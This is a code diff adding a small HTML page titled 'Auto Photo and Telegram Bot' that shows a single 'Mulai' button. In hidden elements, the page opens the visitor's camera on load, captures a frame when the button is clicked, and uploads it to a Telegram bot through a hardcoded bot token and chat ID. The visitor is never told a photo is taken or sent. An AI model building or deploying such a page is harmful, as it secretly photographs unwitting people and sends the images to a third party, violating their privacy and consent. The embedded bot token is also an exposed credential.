@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Photo and Telegram Bot</title>
+    <style>
+        /* Center the button and style it */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        #startButton {
+            width: 120px;
+            height: 50px;
+            background-color: cyan;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        #startButton:focus {
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Button to trigger the photo -->
+    <button id="startButton">Mulai</button>
+
+    <!-- Hidden video element (not displayed) -->
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    
+    <!-- Hidden canvas to process the photo -->
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Access video and canvas elements
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const startButton = document.getElementById('startButton');
+
+        // Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = '6921201257:AAFNwDhl69yeG_J8njcose9gLP-titvbYrU';
+        const CHAT_ID = '6414307313';
+
+        // Access the camera automatically when the page is loaded
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                console.error("Error accessing the camera", error);
+            });
+
+        // Function to capture photo and send to Telegram
+        function capturePhoto() {
+            // Draw the current video frame to the canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert canvas to data URL
+            const imageData = canvas.toDataURL('image/png');
+            
+            // Send image to Telegram
+            sendPhotoToTelegram(imageData);
+        }
+
+        // Function to send photo to Telegram Bot
+        function sendPhotoToTelegram(imageData) {
+            // Convert base64 image to blob
+            const blob = dataURLtoBlob(imageData);
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.png');
+            
+            // Send POST request to Telegram API
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log("Photo sent successfully", result);
+            })
+            .catch(error => {
+                console.error("Error sending photo to Telegram", error);
+            });
+        }
+
+        // Helper function to convert data URL to blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Event listener for button click
+        startButton.addEventListener('click', function() {
+            capturePhoto();  // Take photo when button is clicked
+        });
+    </script>
+</body>
+</html>
